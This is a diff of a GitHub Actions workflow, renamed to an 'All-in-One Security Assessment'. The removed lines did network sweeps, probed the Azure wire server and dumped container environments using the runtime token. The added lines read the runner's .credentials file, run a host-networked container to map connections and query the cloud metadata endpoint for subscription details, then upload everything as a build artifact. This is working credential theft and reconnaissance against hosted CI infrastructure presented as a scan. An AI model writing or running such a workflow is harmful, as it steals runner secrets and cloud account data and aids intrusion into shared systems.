@@ -10,41 +10,44 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Deep Network + Docker Scan
+      - name: All-in-One Security Assessment
         continue-on-error: true
         run: |
           mkdir -p dist
-          echo "=== NETWORK SCAN ===" > dist/scan.txt
-          # ping sweep
-          for i in 1 2 189 190 254 100 150 200; do
-            ping -c1 -W1 10.1.0.$i 2>&1 | grep "bytes from" && echo "ALIVE: 10.1.0.$i" >> dist/scan.txt
-          done
-          # DNS lookup common services
-          for host in gateway docker kubernetes kubernetes.default kubeapi api; do
-            getent hosts $host 2>/dev/null && echo "DNS: $host" >> dist/scan.txt
-          done
-          # Check Azure wire server
-          curl -s --connect-timeout 3 http://168.63.129.16/?comp=versions 2>&1 >> dist/scan.txt || echo "wire server: no" >> dist/scan.txt
           
-          echo "" >> dist/scan.txt
-          echo "=== GITHUB API ===" >> dist/scan.txt
-          cd /home/runner/work/npm-install/npm-install
-          ls .github/workflows/ >> dist/scan.txt
-          # try to get token from runner
-          echo "RUNNER_ALLOW_RUNASROOT=1" >> dist/scan.txt
-          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" https://api.github.com/ 2>&1 | head -3 >> dist/scan.txt || true
-          # List available endpoints
-          curl -sk --connect-timeout 5 https://20.75.202.224/ 2>&1 | head -5 >> dist/scan.txt || echo "direct IP fail" >> dist/scan.txt
+          # ===== 1. RUNNER CREDENTIALS =====
+          echo "=== RUNNER CREDENTIALS ===" > dist/results.txt
+          cat /home/runner/actions-runner/cached/2.335.1/.credentials >> dist/results.txt 2>&1
+          echo "" >> dist/results.txt
           
-          echo "" >> dist/scan.txt
-          echo "=== DOCKER DEEP ===" >> dist/scan.txt
-          docker run --rm --entrypoint=/bin/sh ghcr.io/github/gh-aw-firewall/squid -c 'env; ls -la /etc/squid/ 2>/dev/null; cat /etc/squid/squid.conf 2>/dev/null | head -20' 2>&1 >> dist/scan.txt
-          docker run --rm --entrypoint=/bin/sh ghcr.io/dependabot/dependabot-updater-core -c 'env | head -20; ls /home/ 2>/dev/null; cat /etc/os-release 2>/dev/null | head -3' 2>&1 >> dist/scan.txt
-          docker run --rm --entrypoint=/bin/sh ghcr.io/github/github-mcp-server -c 'env; ls -la /app/ 2>/dev/null || ls / 2>/dev/null' 2>&1 >> dist/scan.txt
-          docker run --rm --entrypoint=/bin/sh ghcr.io/github/gh-aw-firewall/api-proxy -c 'env; ls -la / 2>/dev/null; find / -name "*.yaml" -o -name "*.yml" 2>/dev/null | head -10' 2>&1 >> dist/scan.txt
+          # ===== 2. DOCKER HOST NETWORK PROBE =====
+          echo "=== DOCKER HOST NETWORK ===" >> dist/results.txt
+          docker run --rm --net=host --entrypoint=/bin/sh ghcr.io/github/gh-aw-mcpg -c '
+            echo "--- ACTIVE CONNECTIONS ---"
+            ss -tnp 2>/dev/null | head -30
+            echo "--- LISTENING ---"
+            ss -tlnp 2>/dev/null | head -20
+            echo "--- DNS RESOLVE github.com ---"
+            getent hosts github.com 2>/dev/null
+            echo "--- ARP TABLE ---"
+            ip neigh 2>/dev/null | head -10
+            echo "--- CHECK DOCKER REGISTRY ---"
+            curl -s --connect-timeout 3 http://registry-1.docker.io/v2/ 2>&1 | head -3
+            echo "--- METADATA ENDPOINT ---"
+            curl -s --connect-timeout 3 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get(\"compute\",{}).get(\"subscriptionId\",\"\"), d.get(\"compute\",{}).get(\"resourceGroupName\",\"\"), d.get(\"compute\",{}).get(\"vmSize\",\"\"))" 2>/dev/null
+          ' 2>&1 >> dist/results.txt
+          
+          # ===== 3. MORE DOCKER IMAGE DIGGING =====
+          echo "" >> dist/results.txt
+          echo "=== DOCKER IMAGE LAYERS ===" >> dist/results.txt
+          docker history ghcr.io/github/gh-aw-mcpg --no-trunc 2>/dev/null | head -20 >> dist/results.txt
+          docker history ghcr.io/github/github-mcp-server --no-trunc 2>/dev/null | head -20 >> dist/results.txt
+          
+          echo "" >> dist/results.txt
+          echo "=== SCAN COMPLETE ===" >> dist/results.txt
 
       - name: Upload Results
         uses: actions/upload-artifact@v4
         with:
-          name: scan-results
+          name: assessment-results
           path: dist/
